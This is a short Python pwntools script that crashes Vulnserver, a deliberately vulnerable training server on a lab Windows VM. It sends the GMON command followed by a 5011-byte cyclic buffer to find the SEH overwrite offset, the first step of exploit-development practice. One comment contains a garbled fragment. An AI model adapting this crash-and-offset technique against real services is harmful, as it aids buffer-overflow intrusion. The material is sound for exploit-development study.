#!/usr/bin/python
from pwn import *


host = "192.168.130.156"     # Windows VM
port = 9999                 # Vulnserver port


buffer = cyclic(5011)         # Buffer to crash vulnserver

#use find_offset_position.py to know the offset parsing address of nextSEH where it is ofen written ***CORRUPT ENTRY***

conn = remote(host, port)   # pwntools way to connect to host
conn.recvline()             # receive connection to host

conn.send("GMON /.../" + buffer)     # send evil buffer

conn.close()                        # Close connection if not hung
